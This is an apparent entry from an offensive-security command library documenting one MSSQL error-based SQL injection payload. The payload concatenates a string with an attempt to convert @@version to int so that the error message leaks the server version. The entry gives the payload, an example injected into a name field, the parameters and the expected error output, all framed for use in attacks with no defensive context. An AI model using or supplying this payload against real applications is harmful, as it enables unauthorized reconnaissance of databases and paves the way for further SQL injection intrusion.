---
id: 781b9384-af36-4f07-bff5-c32c2944cadf
name: convert-string-@@version
type: command
executor: sql
data: ''' + convert(int,@@version) + '''
output: null
created_at: '2023-04-06T03:56:33.815978+00:00'
updated_at: '2023-04-10T20:22:41.312777+00:00'
platforms:
  - Windows
  - MSSQL
tags:
  - sql-injection
  - error-based
verified: true
validated: true
---

# convert-string-@@version

## Command

```sql
' + convert(int,@@version) + '
```

## Description

This payload concatenates a string with an attempt to convert @@version to int, causing an error that leaks the version when injected into string-based parameters. Use for SQLi where the input is treated as a string in a concatenation context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| @@version | Server version variable | Yes (built-in) |
| int | Conversion type | Yes (built-in) |

## Examples

### Basic String Injection

In a name field:

```sql
admin' + convert(int,@@version) + '
```

## Expected Output

Error in response: Conversion failure message including the full version string from @@version.

## Related

- [[procedures/MSSQL-Error-Based-Injection-to-Extract-Version]]
- [[commands/cast-string-@@version]]
